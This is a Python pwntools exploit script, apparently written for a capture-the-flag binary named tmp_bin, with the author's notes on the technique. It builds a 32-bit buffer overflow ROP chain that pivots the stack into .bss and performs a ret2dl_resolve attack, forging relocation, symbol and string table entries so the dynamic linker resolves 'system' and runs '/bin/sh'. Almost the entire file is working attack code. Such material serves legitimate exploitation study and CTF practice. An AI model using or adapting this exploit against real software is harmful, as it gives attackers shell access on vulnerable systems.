from pwn import *

inputs = [b'ex4722', b"Well I didn't vote for you.\x00", b'ex4722']

exe = ELF('./tmp_bin')

gdbscript = """
c
"""

def new_processes():
    p = gdb.debug("./tmp_bin",gdbscript=gdbscript)
    for i in inputs:
        p.send(i)
    return p

#def rax_control():
#    payload = flat([
#        b"A"*55,
#        exe.plt.strlen,
#        # GADGET, pop ebx
#        0x08048d36,
#        #vuln.address_ranges[0].start,
#        # STRING
#        0x8048fc3,
#        0x08048d36,
#        0xdeadbeef,
#    ])
#    p.send(payload)

fake_tabble = exe.bss() + 0x200 + 0x24 + 0x24 
jumprel = 0x08048320
symtab  = 0x080481cc
strtab  = 0x0804826c

dl_resolve_func = 0x8048380

jmp_offset = fake_tabble - jumprel
symtab_offset = fake_tabble +8+4 - symtab
str_offset = fake_tabble + 32 +4 - strtab

# GOT loc, after got,  rinfo next, adding padding????
fake_jmprel = p32(exe.got.strncmp + 8) + p32( (symtab_offset // 24)<<8  | 7)  + p32(0)
fake_symtab = p32(str_offset) + p32(0) * 2 + p32(0x12) + p32(0x35) + p32(0)

fake_str = b'system\x00\x00\x00/bin/sh\x00'


p = new_processes()
leave_ret = 0x08048cab
payload = flat([
    b"A"*55,
    exe.plt.read,
    # RET ADDR , pop chain cause of read args, ebp control
    0x08048d18,
    0, # stdin
    # buf
    exe.bss(),
    # size
    0x1337,
    # EBP HERE, new stack
    exe.bss(),
    leave_ret,

])
p.send(payload)

stack = flat([
# leave ret, pops one
    b'A'*4,
    # Reading in dl resolve this time
    exe.plt.read,
    # RET ADDR , pop chain cause of read args, ebp control
    0x08048d18,
    0, # stdin
    # buf
    fake_tabble,
    # size
    0x1337,
    # EBP HERE
    exe.bss() + 32-4,
    leave_ret,
    # Next RIP
    dl_resolve_func,
    jmp_offset,
    0xdeadbeef,
])

input('stack')
p.send(stack)
input("B DL")
p.send( fake_jmprel +fake_symtab +fake_str)

"""
How to ret 2 dl_resolve:
push val1
dl_runtime_resolve()
val1 + jumprel -(ONE ENTRY???) == Elf32_Rel  *reloc_table
    *reloc_table  = got addr
    *reloc_table +4 = r_info 
        ELF32_R_SYM == r_info >>8 
        ELF32_R_TYPE == r_info & 0xff ( 7 for GOT??)

func's symtab == symtab + ELF32_R_SYM * 24

name = STRTAB + func's symtab(First entry)


elf_machine_fixup_plt()
Writes result to got addr specificed

"""

